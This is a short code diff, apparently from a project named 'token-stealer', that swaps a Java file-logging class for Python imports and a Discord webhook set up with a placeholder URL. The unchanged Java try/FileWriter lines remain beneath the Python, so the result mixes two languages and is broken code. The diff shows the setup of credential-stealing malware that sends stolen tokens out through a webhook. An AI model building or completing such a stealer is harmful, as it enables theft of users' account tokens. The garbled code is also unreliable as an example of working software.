@@ -1,10 +1,9 @@
 package token-stealer;
 
-import java.io.*;
+import os, json
+from discord_webhook import DiscordWebhook
 
-public class Logger {
-    public void log(String input) throws IOException {
-        String path = "C:\\Users\\username\\Desktop\\log.txt";
+webhook = DiscordWebhook(url='WEBHOOK URL')
 
         try {
             FileWriter fw = new FileWriter(path, true);
